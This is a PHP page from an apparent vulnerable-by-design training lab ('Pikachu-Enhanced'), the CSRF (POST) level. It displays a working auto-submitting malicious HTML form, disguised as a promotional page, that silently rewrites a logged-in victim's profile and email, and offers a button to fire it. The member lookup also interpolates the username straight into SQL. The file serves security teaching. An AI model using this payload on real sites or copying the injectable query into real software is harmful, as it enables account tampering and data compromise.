<?php
/**
 * Pikachu-Enhanced v2.0 - CSRF (POST) 会员中心与 HTML 表单 PoC 生成器
 */

$PIKA_ROOT_DIR = "../../../";
include_once $PIKA_ROOT_DIR . "inc/config.inc.php";
include_once $PIKA_ROOT_DIR . "inc/function.php";
include_once $PIKA_ROOT_DIR . "inc/mysql.inc.php";

$ACTIVE = array_fill(0, 250, '');
$ACTIVE[25] = 'active open';
$ACTIVE[28] = 'active';

$link = connect();

// 判断是否登录，没有登录不能访问
if (!check_csrf_login($link)) {
    header("location:csrf_post_login.php");
    exit();
}

if (isset($_GET['logout']) && $_GET['logout'] == 1) {
    unset($_SESSION['csrf']);
    header("location:csrf_post_login.php");
    exit();
}

// 查询当前会员信息
$username = $_SESSION['csrf']['username'];
$query = "select * from member where username='$username'";
$result = execute($link, $query);
$data = mysqli_fetch_assoc($result);

$name = $data['username'] ?? '';
$sex = $data['sex'] ?? '';
$phonenum = $data['phonenum'] ?? '';
$add = $data['address'] ?? '';
$email = $data['email'] ?? '';

// 构造 POST 目标 URL
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'] ?? '127.0.0.1:8765';
$target_action = "{$protocol}{$host}/vul/csrf/csrfpost/csrf_post_edit.php";

$poc_html = <<<HTML
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Malicious CSRF POST Exploit</title>
</head>
<body>
    <h3>正在为您加载优惠内容，请稍候...</h3>
    <form id="csrfForm" action="{$target_action}" method="POST">
        <input type="hidden" name="sex" value="girl" />
        <input type="hidden" name="phonenum" value="13999999999" />
        <input type="hidden" name="add" value="Hacker_Pwned_Post" />
        <input type="hidden" name="email" value="pwned_post@evil.com" />
        <input type="hidden" name="submit" value="submit" />
    </form>
    <script>
        // 自动触发表单提交
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
HTML;

include_once $PIKA_ROOT_DIR . 'header.php';
?>

<style>
.profile-card {
    background-color: var(--bg-card);
    border: 1px solid var(--border-color);
    border-radius: 14px;
    padding: 26px;
    box-shadow: 0 4px 18px rgba(0, 0, 0, 0.03);
    height: 100%;
}
.profile-header-box {
    display: flex;
    align-items: center;
    gap: 16px;
    padding-bottom: 20px;
    border-bottom: 1px solid var(--border-color);
    margin-bottom: 20px;
}
.profile-avatar-post {
    width: 60px;
    height: 60px;
    border-radius: 50%;
    background: linear-gradient(135deg, #f59e0b, #d97706);
    color: #ffffff;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 26px;
    font-weight: 800;
    box-shadow: 0 4px 14px rgba(245, 158, 11, 0.35);
}
.profile-field-row {
    display: flex;
    align-items: center;
    padding: 10px 0;
    border-bottom: 1px dashed var(--border-color);
    font-size: 13.5px;
}
.profile-field-label {
    width: 100px;
    color: var(--text-muted);
    font-weight: 600;
    display: flex;
    align-items: center;
    gap: 6px;
}
.profile-field-val {
    color: var(--text-primary);
    font-weight: 700;
    flex-grow: 1;
}

.poc-box {
    background: var(--bg-secondary);
    border: 1px solid var(--border-color);
    border-radius: 10px;
    padding: 16px;
    margin-top: 14px;
    font-family: 'Fira Code', 'Consolas', monospace;
    font-size: 12px;
    word-break: break-all;
    white-space: pre-wrap;
    color: #d97706;
}
[data-theme="dark"] .poc-box {
    color: #fbbf24;
    background: #090d16;
}
</style>

<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li><i class="ace-icon fa fa-home home-icon"></i><a href="../csrf.php">CSRF</a></li>
                <li class="active">CSRF (POST) - 个人会员中心</li>
            </ul>
        </div>

        <div class="page-content">
            <div class="cyber-stage-container">
                
                <!-- Stage Header Banner -->
                <div class="cyber-header-card">
                    <h1 class="cyber-header-title">
                        👤 CSRF (POST) - 个人会员中心
                        <span class="cyber-badge-chip" style="border-color:#f59e0b; color:#fbbf24; background:rgba(245,158,11,0.15);">POST 传输 · 自动提交利用链</span>
                    </h1>
                    <p class="cyber-desc-text">
                        当前会员 <b><?php echo htmlspecialchars($name); ?></b> 已处于登录态。右侧展示了黑客如何编写一个含有自动提交隐藏表单的第三方恶意 HTML 页面（PoC）。当受害者浏览器加载该页面时，JavaScript 自动触发跨站 POST 请求完成对会员档案的越权篡改！
                    </p>
                </div>

                <div class="row">
                    <!-- Left: Profile Info Card -->
                    <div class="col-lg-5 col-md-12" style="margin-bottom:20px;">
                        <div class="profile-card">
                            <div class="profile-header-box">
                                <div class="profile-avatar-post">
                                    <i class="fa fa-user"></i>
                                </div>
                                <div style="flex-grow:1;">
                                    <h3 style="margin:0 0 4px 0; color:var(--text-primary); font-weight:800; font-size:18px;">
                                        <?php echo htmlspecialchars($name); ?>
                                    </h3>
                                    <span style="font-size:12px; color:var(--text-muted);">
                                        <i class="fa fa-check-circle" style="color:#10b981;"></i> POST 鉴权会话保持中
                                    </span>
                                </div>
                                <a href="csrf_post.php?logout=1" class="btn btn-xs btn-default" style="border-radius:6px;">
                                    <i class="fa fa-sign-out"></i> 安全退出
                                </a>
                            </div>

                            <div class="profile-field-row">
                                <span class="profile-field-label"><i class="fa fa-id-card"></i> 账 户</span>
                                <span class="profile-field-val"><?php echo htmlspecialchars($name); ?></span>
                            </div>
                            <div class="profile-field-row">
                                <span class="profile-field-label"><i class="fa fa-venus-mars"></i> 性 别</span>
                                <span class="profile-field-val"><?php echo htmlspecialchars($sex); ?></span>
                            </div>
                            <div class="profile-field-row">
                                <span class="profile-field-label"><i class="fa fa-phone"></i> 手 机</span>
                                <span class="profile-field-val"><?php echo htmlspecialchars($phonenum); ?></span>
                            </div>
                            <div class="profile-field-row">
                                <span class="profile-field-label"><i class="fa fa-map-marker"></i> 住 址</span>
                                <span class="profile-field-val"><?php echo htmlspecialchars($add); ?></span>
                            </div>
                            <div class="profile-field-row" style="border-bottom:none;">
                                <span class="profile-field-label"><i class="fa fa-envelope"></i> 邮 箱</span>
                                <span class="profile-field-val"><?php echo htmlspecialchars($email); ?></span>
                            </div>

                            <div style="margin-top:24px;">
                                <a href="csrf_post_edit.php" class="btn btn-block btn-warning" style="border-radius:8px; font-weight:700; color:#fff; background:linear-gradient(135deg, #f59e0b, #d97706); border:none; padding:10px;">
                                    <i class="fa fa-pencil"></i> 手动修改个人信息 (POST 表单)
                                </a>
                            </div>
                        </div>
                    </div>

                    <!-- Right: Live PoC & Attack Exploit Panel -->
                    <div class="col-lg-7 col-md-12" style="margin-bottom:20px;">
                        <div class="profile-card">
                            <h4 style="margin:0 0 14px 0; color:var(--text-primary); font-weight:800; font-size:16px; display:flex; align-items:center; gap:8px;">
                                <i class="fa fa-code" style="color:#f59e0b;"></i> POST CSRF 自动提交 Exploit 生成器
                            </h4>

                            <div class="alert alert-info" style="border-radius:8px; font-size:12.5px; padding:12px; margin-bottom:14px;">
                                <i class="fa fa-info-circle"></i> <b>利用原理：</b> 目标接口仅校验是否包含 POST 参数与登录 Session，未包含 Anti-CSRF Token。攻击者将下方 HTML 代码保存为 <code>poc.html</code> 并放置于外部恶意站点，受害者访问后即刻被静默篡改。
                            </div>

                            <label style="font-size:13px; font-weight:700; color:var(--text-primary); margin-bottom:6px; display:block;">
                                📜 完整恶意第三方 PoC HTML 代码：
                            </label>
                            <div class="poc-box" id="pocHtmlText"><?php echo htmlspecialchars($poc_html); ?></div>

                            <div style="margin-top:14px; display:flex; gap:10px; flex-wrap:wrap;">
                                <button type="button" class="btn btn-sm btn-warning" onclick="copyPocHtml()" style="border-radius:6px; font-weight:700; color:#fff;">
                                    <i class="fa fa-copy"></i> 一键复制完整 PoC HTML
                                </button>
                                <button type="button" class="btn btn-sm btn-danger" onclick="triggerPostAttack()" style="border-radius:6px; font-weight:700;">
                                    <i class="fa fa-bolt"></i> 模拟外部表单自动提交
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Navigation Footer -->
                <div style="display:flex; justify-content:space-between; align-items:center; border-top:1px solid var(--border-color); padding-top:18px; margin-top:10px;">
                    <a href="../csrfget/csrf_get.php" class="btn btn-info" style="border-radius:8px; font-weight:700;">
                        <i class="fa fa-arrow-left"></i> 上一关：CSRF (GET)
                    </a>
                    <a href="../csrftoken/token_get_login.php" class="btn btn-success" style="border-radius:8px; font-weight:700; background:linear-gradient(135deg, #10b981, #059669); border:none;">
                        下一关：CSRF Token 防御机制 <i class="fa fa-arrow-right"></i>
                    </a>
                </div>

            </div>
        </div>
    </div>
</div>

<form id="simulatedAttackForm" action="<?php echo htmlspecialchars($target_action); ?>" method="POST" style="display:none;">
    <input type="hidden" name="sex" value="girl" />
    <input type="hidden" name="phonenum" value="13999999999" />
    <input type="hidden" name="add" value="Hacker_Pwned_Post" />
    <input type="hidden" name="email" value="pwned_post@evil.com" />
    <input type="hidden" name="submit" value="submit" />
</form>

<script>
function copyPocHtml() {
    const text = document.getElementById('pocHtmlText').innerText;
    navigator.clipboard.writeText(text).then(() => {
        alert('PoC HTML 代码已复制到剪贴板！');
    }).catch(err => {
        alert('复制失败，请手动选择复制。');
    });
}

function triggerPostAttack() {
    if (confirm('确认模拟外部恶意网站向当前目标提交跨站 POST 请求？')) {
        document.getElementById('simulatedAttackForm').submit();
    }
}
</script>

<?php
include_once $PIKA_ROOT_DIR . 'footer.php';
?>
